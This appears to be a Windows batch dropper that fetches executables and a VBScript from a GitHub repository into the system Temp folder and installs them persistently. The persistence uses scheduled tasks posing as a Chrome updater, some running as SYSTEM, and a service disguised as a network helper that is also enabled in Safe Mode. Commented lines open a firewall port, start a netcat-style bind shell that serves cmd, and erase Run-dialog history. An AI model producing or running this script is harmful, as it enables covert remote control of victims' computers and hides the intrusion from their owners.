@echo off & mode 16,1
curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libcrypto-3.dll > C:\Windows\Temp\libcrypto-3.dll
curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libssh2.dll > C:\Windows\Temp\libssh2.dll
curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libssl-3.dll > C:\Windows\Temp\libssl-3.dll
curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/svclhost.exe > C:\Windows\Temp\svclhost.exe
curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/svclhost.vbs > C:\Windows\Temp\svclhost.vbs
set tt=%time:~0,5%
REM cmd /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" >nul 2>&1
SCHTASKS /CREATE /SC MINUTE /MO 30 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /F >nul 2>&1
SCHTASKS /CREATE /SC MINUTE /MO 30 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /RU system /F >nul 2>&1
REM SCHTASKS /CREATE /SC ONLOGON /TN "Microsoft\Office\Office ClickToRun Logon" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /RU system /F >nul 2>&1
SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" >nul 2>&1
sc.exe create iphlpsvcs binpath= "WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" group= NetworkProvider type= own start= auto error= ignore displayname= "DHCP Config" >nul 2>&1
cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\iphlpsvcs" /f /t REG_SZ /d "Service" >nul 2>&1
sc description iphlpsvcs "Provides tunnel connectivity using IPv6 transition technologies (6to4, ISATAP, Port Proxy, and Teredo), and IP-HTTPS. If this service is stopped, the computer will not have the enhanced connectivity benefits that these technologies offer." >nul 2>&1


REM netsh firewall add portopening TCP 4422 "Service Firewall" ENABLE ALL
REM cmd /c C:\Windows\Temp\svclhost.exe -lvp 4422 -e cmd
REM reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
